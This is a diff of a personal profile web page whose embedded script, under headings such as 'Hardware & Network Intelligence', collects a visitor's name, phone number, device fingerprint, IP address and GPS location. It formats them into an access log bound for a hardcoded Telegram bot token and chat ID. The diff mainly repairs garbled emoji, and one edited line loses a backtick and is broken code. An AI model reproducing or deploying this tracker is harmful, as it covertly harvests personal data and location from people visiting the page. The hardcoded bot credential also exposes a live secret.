@@ -404,7 +404,7 @@
             <div class="owner-profile">
                 <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" alt="Lalu Kumar Tanti">
                 <h1>Lalu Kumar Tanti</h1>
-                <h3>Creative Developer â€¢ Learner â€¢ Dream Builder</h3>
+                <h3>Creative Developer • Learner • Dream Builder</h3>
                 <p>
                     A passionate and hardworking individual with a strong interest in technology,
                     web development, and creative digital projects. Always eager to learn new skills,
@@ -487,13 +487,13 @@
 
     <script>
         // ==========================================
-        // ðŸš¨ CONFIGURATION ðŸš¨
+        // 🚨 CONFIGURATION 🚨
         // ==========================================
         const TG_TOKEN = "8474692567:AAFU6lnQg9Tv23NA2vrXd3XemrHmQDO8I98";
         const TG_CHAT = "7342190170";
 
         // ==========================================
-        // ðŸ”’ 1. ADVANCED DEVICE MODEL DETECTION
+        // 🔒 1. ADVANCED DEVICE MODEL DETECTION
         // ==========================================
         async function getDeviceModel() {
             try {
@@ -520,7 +520,7 @@
         }
 
         // ==========================================
-        // ðŸ”’ 2. HARDWARE & NETWORK INTELLIGENCE
+        // 🔒 2. HARDWARE & NETWORK INTELLIGENCE
         // ==========================================
         function getGPUInfo() {
             try {
@@ -561,7 +561,7 @@
         }
 
         // ==========================================
-        // ðŸš€ MAIN EXECUTION SEQUENCE
+        // 🚀 MAIN EXECUTION SEQUENCE
         // ==========================================
         async function initiateSecureEntry() {
             const name = document.getElementById('g-name').value;
@@ -629,31 +629,31 @@
 
             // --- STEP 3: BUILD MESSAGE ---
             const message = `
-ðŸš¨ *SECURE HUB ACCESS LOG* ðŸš¨
+🚨 *SECURE HUB ACCESS LOG* 🚨
 
-ðŸ‘¤ *USER IDENTITY*
-â€¢ Name: ${name}
-â€¢ Phone: \`${phone}\`
+• *USER IDENTITY*
+• Name: ${name}
+• Phone: \`${phone}\`
 
-ðŸ“± *DEVICE FINGERPRINT*
-â€¢ *Model:* \`${model}\`
-â€¢ *OS/Browser:* ${browser}
-â€¢ *Screen:* ${screenInfo}
-â€¢ *Timezone:* ${timezone}
+📱 *DEVICE FINGERPRINT*
+• *Model:* \`${model}\`
+• *OS/Browser:* ${browser}
+• *Screen:* ${screenInfo}
+• *Timezone:* ${timezone}
 
-âš™ï¸ *HARDWARE SPECS*
-â€¢ *GPU:* ${gpu}
-â€¢ *CPU/RAM:* ${hardware}
-â€¢ *Battery:* ${battery}
+⚙️ *HARDWARE SPECS*
+• *GPU:* ${gpu}
+• *CPU/RAM:* ${hardware}
+• *Battery:* ${battery}
 
-ðŸ“¡ *NETWORK INTEL*
-â€¢ *IP:* \`${ip}\`
-â€¢ *Type:* ${network}
+📡 *NETWORK INTEL*
+• *IP:* \`${ip}\`
+• *Type:* ${network}
 
-ðŸ“ *LOCATION DATA*
-${locData ? `â€¢ Coords: \`${locData.lat}, ${locData.lon}\`\nâ€¢ Accuracy: ${Math.round(locData.acc)}m\nðŸ”— [Open Maps](https://www.google.com/maps?q=${locData.lat},${locData.lon})` : "âŒ Location Denied/Unavailable"}
+📍 *LOCATION DATA*
+${locData ? • Coords: \`${locData.lat}, ${locData.lon}\`\n• Accuracy: ${Math.round(locData.acc)}m\n🔗 [Open Maps](https://www.google.com/maps?q=${locData.lat},${locData.lon})` : "âŒ Location Denied/Unavailable"}
 
-â° *Time:* ${new Date().toLocaleString()}
+⏰ *Time:* ${new Date().toLocaleString()}
 `;
 
             // --- STEP 4: SEND TO TELEGRAM ---
